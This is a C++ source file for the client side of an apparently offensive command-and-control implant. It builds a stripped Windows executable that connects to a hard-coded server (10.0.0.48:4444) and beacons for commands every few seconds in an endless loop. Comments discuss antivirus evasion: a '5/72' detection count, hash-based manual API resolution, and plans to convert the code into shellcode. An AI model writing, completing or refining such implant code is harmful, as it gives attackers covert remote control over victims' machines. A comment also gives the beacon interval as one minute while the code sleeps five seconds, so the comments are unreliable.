/* TODO:
 * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe
 * 
 * // Working flags below, 5/72
 * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe 
 * */

// TODO: eventually convert to c code then asm then shell code?

//#include "stager.h"


#include "Client.h"





Client::Client() : 
	transporter_(messageHandler_, "10.0.0.48", "4444") // Default server address
{
	messageHandler_.setTransporter(transporter_);
}

Client::Client(TCPTransporter transporter, std::string server, std::string port) : // TODO: transporter parameter isn't used 
	transporter_(messageHandler_, server, port)
{
	messageHandler_.setTransporter(transporter_);
}

bool Client::run()
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/


	while (true)
	{
		if (!transporter_.isConnected())
		{
			transporter_.connect();    // Try to connect (handles if already connected)
		}
		transporter_.beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
		//transporter_.receive();
		//transporter_.sendMessage();
		Sleep(5000);            // Wait 1 minute
	}
	return false;
}
